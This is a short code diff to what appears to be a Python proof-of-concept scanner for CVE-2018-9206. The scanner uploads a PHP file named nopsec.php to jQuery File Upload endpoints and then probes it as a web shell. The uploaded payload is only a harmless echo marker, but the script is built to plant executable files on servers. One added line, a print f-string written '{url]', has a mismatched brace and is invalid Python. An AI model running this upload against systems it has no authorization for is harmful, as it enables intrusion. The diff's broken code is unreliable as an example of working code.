@@ -23,7 +23,7 @@ OUTPUTS = [
     "{prefix}/server/php/files/nopsec.php"
 ]
 
-SHELL_CONTENT = "<?php echo 'Vulnerable to CVE-2018-9206: ' . date('Y-m-d h:i:sa'); ?>"
+SHELL_CONTENT = "<?php echo 'Vulnerable to CVE-2018-9206 on ' . date('Y-m-d h:i:sa'); ?>"
 
 PORTS = {80 : 'http', 8000 : 'http', 8080 : 'http', 443 : 'https', 8443 : 'https'}
 
@@ -130,7 +130,7 @@ def probe_web_shell(host, protocol):
                 'User-Agent': args.user_agent
             })
             if r.status_code == 200:
-                print(f'[+] {r.text}')
+                print(f'[*] {url]: {r.text}')
                 break
         except Exception as e:
             pass
